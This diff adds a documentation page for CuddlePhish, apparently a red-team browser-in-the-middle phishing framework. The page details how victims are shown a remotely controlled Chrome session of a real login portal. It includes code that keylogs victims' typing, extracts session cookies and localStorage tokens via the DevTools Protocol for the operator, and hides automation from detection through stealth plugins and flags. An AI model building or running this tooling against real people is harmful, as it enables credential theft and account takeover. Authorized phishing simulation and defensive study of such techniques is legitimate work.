@@ -1,0 +1,736 @@
+---
+title: 'Technical Architecture'
+description: 'Deep dive into CuddlePhish internal architecture and implementation details'
+icon: 'diagram-project'
+---
+
+## System Architecture
+
+### High-Level Overview
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                        Phishing Victim                       │
+│                     (Web Browser Client)                     │
+│  ┌────────────┐  ┌────────────┐  ┌─────────────────────┐   │
+│  │ cuddlephish│  │  WebSocket │  │   WebRTC Video      │   │
+│  │   .html    │──│ Connection │──│   Player (Viewer)   │   │
+│  │            │  │            │  │                     │   │
+│  └────────────┘  └────────────┘  └─────────────────────┘   │
+└────────────┬────────────────────────────────────────────────┘
+             │
+             │ HTTPS (Caddy Reverse Proxy)
+             │
+┌────────────▼────────────────────────────────────────────────┐
+│                    CuddlePhish Server                        │
+│  ┌────────────────────────────────────────────────────────┐ │
+│  │               Fastify + Socket.io Server               │ │
+│  │            (WebSocket & HTTP Multiplexer)              │ │
+│  └──────┬─────────────────────────────────┬───────────────┘ │
+│         │                                 │                  │
+│  ┌──────▼─────────┐             ┌────────▼────────────┐    │
+│  │  Admin UI      │             │   Browser Manager   │    │
+│  │  (admin.html)  │             │  (Puppeteer/CDP)    │    │
+│  └────────────────┘             └─────────┬───────────┘    │
+│                                            │                 │
+│                          ┌─────────────────▼──────┐         │
+│                          │   Chrome Instances     │         │
+│                          │   (Xvfb Virtual       │         │
+│                          │    Display Per Browser)│         │
+│                          │  ┌──────────────────┐  │         │
+│                          │  │ target_page      │  │         │
+│                          │  │ (login portal)   │  │         │
+│                          │  └──────────────────┘  │         │
+│                          │  ┌──────────────────┐  │         │
+│                          │  │ broadcast_page   │  │         │
+│                          │  │ (broadcast.html) │  │         │
+│                          │  │ WebRTC Broadcast │  │         │
+│                          │  └──────────────────┘  │         │
+│                          └────────────────────────┘         │
+└──────────────────────────────────────────────────────────────┘
+```
+
+### Component Interaction Flow
+
+<Steps>
+  <Step title="Initialization">
+    Server spawns initial Chrome instance ("empty phishbowl") with Xvfb, navigates to target, loads broadcast page
+  </Step>
+
+  <Step title="Victim Connection">
+    Victim HTTP request → Caddy → Fastify → Serves cuddlephish.html → Victim browser connects via WebSocket
+  </Step>
+
+  <Step title="Browser Pairing">
+    Server pairs victim socket with available browser socket, prepares WebRTC negotiation
+  </Step>
+
+  <Step title="WebRTC Establishment">
+    Browser broadcasts offer → Server relays to victim → Victim sends answer → ICE candidates exchanged
+  </Step>
+
+  <Step title="Video Streaming">
+    Peer-to-peer WebRTC video stream established (Chrome → Victim), input forwarding enabled
+  </Step>
+
+  <Step title="Control Flow">
+    Victim inputs → WebSocket → Server → Chrome DevTools Protocol → Browser actions
+  </Step>
+</Steps>
+
+## Core Components
+
+### index.js - Main Server
+
+The primary orchestration component built on Fastify and Socket.io.
+
+#### Key Data Structures
+
+**Browser Objects:**
+```javascript
+{
+  socket_id: '',              // Browser's WebSocket ID
+  victim_socket: '',          // Associated victim's socket ID
+  victim_width: 0,            // Victim's viewport width
+  victim_height: 0,           // Victim's viewport height
+  victim_ip: '',              // Victim's IP address
+  victim_target_id: '',       // Campaign tracking ID
+  controller_socket: '',      // Current controller's socket ID
+  keylog: '',                 // Processed keylog string
+  keylog_file: WriteStream,   // File handle for raw keylog
+  browser_id: '',             // Unique random identifier
+  target_page: Page,          // Puppeteer page object for target
+  broadcast_page: Page,       // Puppeteer page for WebRTC
+  remove_instance: Function,  // Cleanup function
+  // ... Puppeteer Browser object properties
+}
+```
+
+**browsers Array:**
+Extended Array with custom `.get()` method:
+```javascript
+browsers.get = function(attr, val){
+  return this.filter(x => x[attr] === val)[0]
+}
+
+// Usage:
+const browser = browsers.get('browser_id', 'abc123')
+const browser = browsers.get('victim_socket', socket.id)
+```
+
+#### HTTP Routes
+
+**Victim Route (`/*`):**
+```javascript
+fastify.route({
+  method: ['GET'],
+  url: '/*',
+  handler: async function (req, reply) {
+    // Extracts client IP from X-Real-IP header
+    // Retrieves tracking ID from query parameters
+    // Logs to Phishmonger if configured
+    // Streams cuddlephish.html with variable substitution
+  }
+})
+```
+
+**Admin Route (`/admin`):**
+```javascript
+fastify.route({
+  method: ['GET'],
+  url: '/admin',
+  handler: async function (req, reply) {
+    // Validates IP against admin_ips whitelist
+    // Serves admin.html with socket_key substitution
+  }
+})
+```
+
+**Broadcast Route (`/broadcast`):**
+```javascript
+fastify.route({
+  method: ['GET'],
+  url: '/broadcast',
+  handler: async function (req, reply) {
+    // Only accessible without X-Real-IP header
+    // Prevents external access via reverse proxy
+    // Serves broadcast.html to automated browsers
+  }
+})
+```
+
+#### WebSocket Events
+
+**Browser Events:**
+
+`new_broadcast`:
+```javascript
+socket.on('new_broadcast', async function(browser_id){
+  // Browser instance announces itself
+  // Associates socket ID with browser object
+  // Sets up frame navigation listener for URL sync
+})
+```
+
+`new_thumbnail`:
+```javascript
+socket.on('new_thumbnail', async function(thumbnail){
+  // Browser sends canvas screenshot as base64
+  // Forwarded to all admin sockets
+  // Includes browser_id and keylog data
+})
+```
+
+`video_stream_offer/answer`:
+```javascript
+socket.on('video_stream_offer', async function(viewer_socket_id, offer){
+  // Relays WebRTC offer from browser to victim
+  // Brings broadcast page to front for capture
+})
+
+socket.on('video_stream_answer', async function(broadcaster_socket_id, answer){
+  // Relays WebRTC answer from victim to browser
+})
+```
+
+**Victim Events:**
+
+`new_phish`:
+```javascript
+socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
+  // New victim connection
+  // Pairs victim with empty phishbowl browser
+  // Resizes browser window to match victim viewport
+  // Initiates WebRTC stream
+  // Spawns new empty phishbowl for next victim
+})
+```
+
+`mouse_event`:
+```javascript
+socket.on('mouse_event', async function(mouse_event){
+  // Receives mouse events from controller
+  // Translates to Puppeteer mouse commands
+  // Applies to controlled browser instance
+})
+```
+
+`keydown/keyup`:
+```javascript
+socket.on('keydown', async function(key){
+  // Receives keyboard events from controller
+  // Logs keystroke if from victim
+  // Uses CDP Input.dispatchKeyEvent for single chars
+  // Uses Puppeteer keyboard.down() for special keys
+})
+```
+
+**Admin Events:**
+
+`take_over_browser`:
+```javascript
+socket.on('take_over_browser', async function(browser_id, viewport_width, viewport_height){
+  // Clears previous takeover if exists
+  // Sets admin as controller
+  // Resizes browser to admin viewport
+  // Initiates WebRTC stream to admin
+})
+```
+
+`get_cookies`:
+```javascript
+socket.on('get_cookies', async function(browser_id){
+  // Uses CDP Storage.getCookies
+  // Uses CDP DOMStorage.getDOMStorageItems
+  // Sends JSON to admin for download
+})
+```
+
+`remove_instance`:
+```javascript
+socket.on('remove_instance', async function(browser_id){
+  // Calls browser.remove_instance()
+  // Stops Xvfb, closes browser, closes file handles
+  // Notifies all admins of removal
+})
+```
+
+### Browser Lifecycle Management
+
+#### Spawning Browsers: get_browser()
+
+```javascript
+async function get_browser(target_page){
+  // 1. Start Xvfb virtual display
+  let xvfb = new Xvfb({
+    xvfb_args: ["-screen", "0", '2880x1800x24', "-ac"]
+  })
+  xvfb.start()
+
+  // 2. Configure Puppeteer launch options
+  let puppet_options = [
+    "--ignore-certificate-errors",
+    `--auto-select-desktop-capture-source=${target.tab_title}`,
+    "--disable-blink-features=AutomationControlled",
+    "--start-maximized",
+    "--no-sandbox",
+    `--display=${xvfb._display}`
+  ]
+
+  // 3. Create unique browser ID and user data directory
+  let browser_id = Math.random().toString(36).slice(2)
+  fs.mkdirSync(`./user_data/${browser_id}`)
+
+  // 4. Launch Puppeteer with stealth plugins
+  let browser = await puppeteer.launch({
+    headless: false,  // Required for WebRTC
+    userDataDir: `./user_data/${browser_id}`,
+    args: puppet_options
+  })
+
+  // 5. Extend browser object with custom properties
+  browser.browser_id = browser_id
+  browser.keylog_file = fs.createWriteStream(...)
+  browser.remove_instance = async function(){ ... }
+
+  // 6. Open target page and broadcast page
+  browser.target_page = await browser.newPage()
+  await browser.target_page.goto(target_page)
+  browser.broadcast_page = await browser.newPage()
+  browser.broadcast_page.goto(`http://localhost:58082/broadcast?id=${browser_id}`)
+
+  return browser
+}
+```
+
+#### Browser Removal
+
+```javascript
+browser.remove_instance = async function(){
+  xvfb.stop()                              // Stop virtual display
+  browser.keylog_file.close()              // Close file handle
+  const index = browsers.indexOf(browser)  // Find in array
+  await browser.close()                    // Close Puppeteer browser
+  delete browsers[index]                   // Remove from tracking
+}
+```
+
+### WebRTC Implementation
+
+#### Broadcast Side (broadcast.html)
+
+**Display Capture:**
+```javascript
+const stream = await navigator.mediaDevices.getDisplayMedia({'video': true})
+
+// Chrome automatically selects tab matching --auto-select-desktop-capture-source
+// No user interaction required
+```
+
+**Peer Connection Setup:**
+```javascript
+const peerConnection = new RTCPeerConnection({
+  iceServers: [{urls: "stun:stun.l.google.com:19302"}]
+})
+
+// Add video track from display capture
+stream.getTracks().forEach(track =>
+  peerConnection.addTrack(track, stream)
+)
+
+// Create offer and send to viewer
+const offer = await peerConnection.createOffer()
+await peerConnection.setLocalDescription(offer)
+socket.emit("video_stream_offer", viewer_socket_id, offer)
+```
+
+**Thumbnail Generation:**
+```javascript
+const canvas = document.querySelector('canvas')
+const video = document.querySelector('video')
+
+setInterval(function(){
+  canvas.width = video.videoWidth
+  canvas.height = video.videoHeight
+  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height)
+  let image = canvas.toDataURL()  // Base64 PNG
+  socket.emit("new_thumbnail", {image: image, browser_id: browser_id})
+}, 2000)
+```
+
+#### Viewer Side (cuddlephish.html)
+
+**Peer Connection Setup:**
+```javascript
+const peerConnection = new RTCPeerConnection({
+  iceServers: [{urls: "stun:stun.l.google.com:19302"}]
+})
+
+// Receive offer from broadcaster
+socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
+  // Set remote description and create answer
+  await peerConnection.setRemoteDescription(offer)
+  const answer = await peerConnection.createAnswer()
+  await peerConnection.setLocalDescription(answer)
+  socket.emit("video_stream_answer", broadcaster_socket_id, answer)
+})
+
+// Receive video track
+peerConnection.ontrack = function(event){
+  video.srcObject = event.streams[0]
+}
+```
+
+**ICE Candidate Exchange:**
+```javascript
+// Both sides exchange ICE candidates
+peerConnection.onicecandidate = function(event){
+  if (event.candidate) {
+    socket.emit("candidate", peer_socket_id, event.candidate)
+  }
+}
+
+socket.on("candidate", function(peer_socket_id, candidate){
+  peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
+})
+```
+
+### Input Forwarding
+
+#### Mouse Events
+
+**Capture:**
+```javascript
+// cuddlephish.html
+document.addEventListener("mousedown", handleMouseEvent)
+document.addEventListener("mouseup", handleMouseEvent)
+document.addEventListener("mousemove", handleMouseEvent)
+document.addEventListener("mousewheel", handleMouseEvent)
+document.addEventListener("click", handleMouseEvent)
+
+function handleMouseEvent(e){
+  socket.emit('mouse_event', {
+    type: e.type,
+    clientX: e.clientX,
+    clientY: e.clientY,
+    wheelDeltaX: e.wheelDeltaX,
+    wheelDeltaY: e.wheelDeltaY
+  })
+}
+```
+
+**Application:**
+```javascript
+// index.js
+socket.on("mouse_event", async function(mouse_event){
+  const browser = browsers.get('controller_socket', socket.id)
+
+  if(mouse_event.type === "click"){
+    await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+  }else if(mouse_event.type === "mousewheel"){
+    browser.target_page.mouse.wheel({deltaX: mouse_event.wheelDeltaX})
+    browser.target_page.mouse.wheel({deltaY: mouse_event.wheelDeltaY})
+  }else if(mouse_event.type === "mousedown"){
+    await browser.target_page.mouse.down()
+  }else if(mouse_event.type === "mouseup"){
+    await browser.target_page.mouse.up()
+  }else if(mouse_event.type === "mousemove"){
+    await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+  }
+})
+```
+
+#### Keyboard Events
+
+**Capture:**
+```javascript
+// cuddlephish.html
+document.addEventListener('keydown', keyDown)
+document.addEventListener('keyup', keyUp)
+
+function keyDown(e) {
+  // Special handling for Tab, Ctrl+C, Ctrl+V
+  if(e.keyCode == 9){ e.preventDefault() }  // Tab
+  if(e.keyCode == 86 && ctrlKey){ return }  // Ctrl+V (paste)
+  if(e.keyCode == 67 && ctrlKey){           // Ctrl+C (copy)
+    socket.emit('copy')
+    e.preventDefault()
+    return
+  }
+  socket.emit("keydown", e.key)
+}
+```
+
+**Application:**
+```javascript
+// index.js
+socket.on("keydown", async function(key){
+  const browser = browsers.get('controller_socket', socket.id)
+
+  // Log keystroke if victim is typing
+  if(browser.victim_socket == socket.id){
+    browser.keylog_file.write(key)
+    // Process backspaces, special keys for display
+    // Update browser.keylog for admin interface
+  }
+
+  // Apply keystroke to browser
+  const istext = key.length === 1
+  if(istext){
+    // Single character - use CDP for better compatibility
+    await browser.target_page._client.send('Input.dispatchKeyEvent', {
+      type: 'keyDown',
+      key: key,
+      text: key,
+    })
+  }else{
+    // Special key - use Puppeteer method
+    await browser.target_page.keyboard.down(key)
+  }
+})
+```
+
+**Keylog Processing:**
+```javascript
+// Processed keylog for admin display
+if(key == 'Backspace'){
+  new_val = current_val.slice(0,-1)  // Remove last char
+}else if(key == 'Tab' || key == 'Enter'){
+  new_val = current_val + '\n'       // Newline for readability
+}else if(key == 'Shift'){
+  new_val = current_val              // Ignore modifier
+}else{
+  new_val = current_val + key        // Append character
+}
+```
+
+### Credential Extraction
+
+#### Chrome DevTools Protocol Integration
+
+**Cookie Extraction:**
+```javascript
+// index.js
+socket.on("get_cookies", async function(browser_id){
+  const browser = browsers.get('browser_id', browser_id)
+
+  // Extract cookies via CDP
+  let cookie_data = await browser.target_page._client.send('Storage.getCookies')
+  let cookies = cookie_data.cookies
+
+  // Extract localStorage via CDP
+  let dom_data = await browser.target_page._client.send('DOMStorage.getDOMStorageItems', {
+    storageId: {
+      securityOrigin: await browser.target_page.evaluate(() => window.origin),
+      isLocalStorage: true,
+    },
+  })
+  let local_storage = dom_data.entries
+
+  // Send to admin for download
+  socket.emit('cookie_jar', {
+    cookies: {
+      url: browser.target_page.url(),
+      cookies: cookies,
+      local_storage: local_storage
+    },
+    browser_id: browser.browser_id
+  })
+})
+```
+
+**Data Structure:**
+```javascript
+{
+  "url": "https://accounts.example.com/dashboard",
+  "cookies": [
+    {
+      "name": "session_token",
+      "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+      "domain": ".example.com",
+      "path": "/",
+      "expires": 1735689600.123456,
+      "size": 150,
+      "httpOnly": true,
+      "secure": true,
+      "session": false,
+      "sameSite": "Lax"
+    }
+  ],
+  "local_storage": [
+    ["auth_token", "Bearer abc123..."],
+    ["user_id", "12345"]
+  ]
+}
+```
+
+### Window Resizing
+
+The `resize_window.js` module dynamically resizes browser windows to match controller viewports.
+
+```javascript
+async function resize_window(browser, page, width, height) {
+  // Set page viewport
+  await page.setViewport({height, width})
+
+  // Account for window chrome (title bar, borders)
+  height += 225  // OS-dependent value
+
+  // Get target info
+  const targets = await browser._connection.send('Target.getTargets')
+  const target = targets.targetInfos.filter(t =>
+    t.attached === true && t.type === 'page'
+  )[0]
+
+  // Get window ID
+  const {windowId} = await browser._connection.send(
+    'Browser.getWindowForTarget',
+    {targetId: target.targetId}
+  )
+
+  // Get current bounds
+  const {bounds} = await browser._connection.send(
+    'Browser.getWindowBounds',
+    {windowId}
+  )
+
+  // Set new bounds
+  if(bounds.windowState === 'normal') {
+    await browser._connection.send('Browser.setWindowBounds', {
+      bounds: {width: width, height: height},
+      windowId
+    })
+  } else {
+    // Minimize first if maximized/fullscreen
+    await browser._connection.send('Browser.setWindowBounds', {
+      bounds: {windowState: 'minimized'},
+      windowId
+    })
+    await browser._connection.send('Browser.setWindowBounds', {
+      bounds: {width: width, height: height},
+      windowId
+    })
+  }
+}
+```
+
+## Security Mechanisms
+
+### Access Control
+
+**Admin IP Whitelisting:**
+```javascript
+// index.js - admin route
+let client_ip = req.headers['x-real-ip']
+if(config.admin_ips.includes(client_ip)){
+  // Serve admin interface
+}else{
+  reply.send("403")
+}
+```
+
+**Socket Authentication:**
+```javascript
+// Admin socket authentication
+fastify.io.use((socket, next) => {
+  const token = socket.handshake.auth.token
+  if(token === config.socket_key){
+    admins.push(socket.id)
+    socket.join('admin_room')
+    next()
+  }else{
+    // Regular victim/browser socket
+    next()
+  }
+})
+```
+
+**Broadcast Route Protection:**
+```javascript
+// Prevent external access to broadcast page
+let client_ip = req.headers['x-real-ip']
+if(client_ip == undefined){
+  // Request came from localhost, allow
+}else{
+  // Request came through reverse proxy, block
+  reply.send("403")
+}
+```
+
+### Stealth Features
+
+**Puppeteer-Extra Stealth Plugin:**
+```javascript
+import puppeteer from 'puppeteer-extra'
+import StealthPlugin from 'puppeteer-extra-plugin-stealth'
+puppeteer.use(StealthPlugin())
+```
+
+Stealth plugin modifies:
+- `navigator.webdriver` (removes automation indicator)
+- `navigator.plugins` (adds realistic plugin list)
+- `navigator.languages` (adds realistic language settings)
+- Chrome DevTools Protocol detection evasions
+
+**User-Agent Override:**
+```javascript
+import UserAgentOverride from 'puppeteer-extra-plugin-stealth/evasions/user-agent-override/index.js'
+const ua = UserAgentOverride({ userAgent: config.default_user_agent })
+puppeteer.use(ua)
+```
+
+Also sets `navigator.platform` to match user-agent OS instead of "Linux".
+
+**Automation Flags Removed:**
+```javascript
+args: [
+  "--disable-blink-features=AutomationControlled",
+]
+ignoreDefaultArgs: ["--enable-automation"]
+```
+
+## Performance Considerations
+
+### Resource Usage Per Browser
+
+- **Memory**: 500MB - 1GB per Chrome instance
+- **CPU**: 10-20% per instance during active use
+- **Disk**: ~50MB per user_data directory
+- **Network**: 2-5 Mbps per WebRTC stream (bandwidth dependent on video quality)
+
+### Scaling Limits
+
+**Single Server:**
+- Recommended: 5-10 concurrent victims
+- Maximum: 20-30 concurrent victims (with sufficient resources)
+
+**Bottlenecks:**
+- RAM consumption by Chrome instances
+- CPU for video encoding/decoding
+- Network bandwidth for WebRTC streams
+- Xvfb overhead for multiple displays
+
+### Optimization Strategies
+
+**Reduce Thumbnail Frequency:**
+```javascript
+// broadcast.html - change interval from 2000ms to 5000ms
+setInterval(function(){ ... }, 5000)
+```
+
+**Lower Video Frame Rate:**
+```javascript
+// broadcast.html
+getDisplayMedia({'video': {frameRate: {max: 15}}})
+```
+
+**Implement Browser Pool:**
+- Pre-spawn browsers during low-activity periods
+- Reuse browser instances for multiple victims (clear cookies between uses)
+- Implement browser instance timeout and auto-cleanup
+
+## Next Steps
+
+- Review [Usage Guide](/cuddlephish-docs/usage) for operational procedures
+- See [Troubleshooting](/cuddlephish-docs/troubleshooting) for debugging techniques
+- Explore [Installation Guide](/cuddlephish-docs/installation) for deployment details
